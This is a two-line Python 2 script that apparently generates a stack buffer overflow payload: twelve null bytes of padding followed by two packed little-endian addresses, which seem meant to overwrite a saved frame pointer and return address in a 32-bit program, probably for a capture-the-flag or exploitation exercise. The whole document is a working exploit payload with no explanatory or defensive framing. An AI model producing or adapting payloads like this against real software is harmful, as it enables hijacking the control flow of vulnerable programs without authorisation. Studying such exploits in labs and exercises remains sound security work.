from struct import pack
print '\x00'*12+pack("<I",0xbffedf78)+pack("<I",0x08048efe)
